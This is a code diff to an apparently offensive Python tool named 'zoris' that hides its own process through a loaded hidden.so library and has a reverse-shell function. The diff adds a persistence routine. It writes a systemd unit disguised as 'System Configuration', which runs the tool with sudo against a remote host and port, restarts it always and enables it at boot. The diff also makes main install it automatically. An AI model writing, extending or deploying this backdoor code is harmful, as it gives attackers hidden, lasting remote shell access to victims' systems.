@@ -10,7 +10,7 @@ from multiprocessing import Process
 from ctypes import *
 import argparse
 
-tempo_sleep = 5
+tempo_sleep = 20
 hidden = CDLL(f'{os.getcwd()}/hidden.so')
 pid = os.getpid() - 1
 
@@ -56,7 +56,35 @@ def rev_shell():
     except:
         return
 
+def persistence():
+    if os.path.isfile('/etc/systemd/system/system.service'):
+        print('\033[0;34m[*]\033[0;37m Persistence is already enabled')
+    else:
+        print('\033[0;34m[*]\033[0;37m Installing persistence')
+        service_content = f'''
+[Unit]
+Description=System Configuration
+After=syslog.target
+
+[Service]
+Type=simple
+WorkingDirectory={os.getcwd()}
+ExecStart=/usr/bin/sudo /bin/sh -cl './zoris -rh {arguments.rhost} -rp {arguments.rport}'
+Restart=always
+KillSignal=SIGQUIT
+
+[Install]
+WantedBy=multi-user.target'''
+
+        file_service = open('/etc/systemd/system/system.service', 'a')
+        file_service.write(service_content)
+        file_service.close()
+        print('\033[0;34m[*]\033[0;37m Enabling persistence')
+        os.system('systemctl enable system')
+        print('\033[0;32m[+]\033[0;37m Persistece enabled!')
+
 def main():
+    persistence()
     hidden.get_pid()
     hidden.mount_pid()
     open('pid.txt', 'a')
